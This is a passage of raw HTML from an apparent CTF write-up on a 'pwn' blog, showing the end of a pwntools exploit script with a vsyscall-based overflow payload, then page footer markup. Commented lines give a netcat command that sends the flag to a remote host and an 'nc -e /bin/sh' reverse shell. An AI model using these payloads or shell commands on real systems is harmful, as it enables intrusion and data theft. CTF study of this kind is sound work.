    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34; = &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">get_interger</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;al?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;N0</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="c1">#  DEBUG([0xEA0, 0xE7F])</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    .text:000000000004F43A                 add     rdi, 7Fh
</span><span class="s1">    .text:000000000004F43E                 jmp     short loc_4F45B
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">vsyscall</span> <span class="o">=</span> <span class="mh">0xffffffffff600000</span>
    <span class="c1">#  cmd = &#34;cat flag| nc ip port;&#34;</span>
    <span class="c1">#  cmd = &#34;nc -e /bin/sh ip port;&#34;</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;sh flag;&#34;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7f</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">cmd</span> 
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xE0</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vsyscall</span><span class="p">)</span> <span class="o">*</span> <span class="mi">20</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x3a</span><span class="s1">&#39;</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;available</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1">#  pause()</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
</div>
</div>
    </div>

    
    

    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/pwn/">pwn</a>
          <a href="https://bash-c.github.io/tags/whitehat/">WhiteHat</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/play-with-file-descriptor-1/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Play with file descriptor(Ⅰ)</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/how-2-pwn-an-arm-binary/">
            <span class="next-text nav-default">如何 pwn 掉一个 arm 的binary</span>
            <span class="prev-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  
    <div class="post bg-white">
      <script src="https://utteranc.es/client.js"
            repo= "bash-c/bash-c.github.io"
            issue-term="pathname"
            crossorigin="anonymous"
            async>
      </script>
    </div>
  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:I_am_M4x@protonmail.com" rel="me noopener" class="iconfont icon-email"
        title="email">
      </a>
      <a href="http://github.com/bash-c" rel="me noopener" class="iconfont icon-github"
        title="github" target="_blank">
      </a>
  <a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml" class="iconfont icon-rss"
    title="rss" target="_blank">
  </a>
  </div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2018
    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
<script type="text/javascript" src="/dist/jane.min.js?v=2.7.0"></script>





  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








</body>
</html>
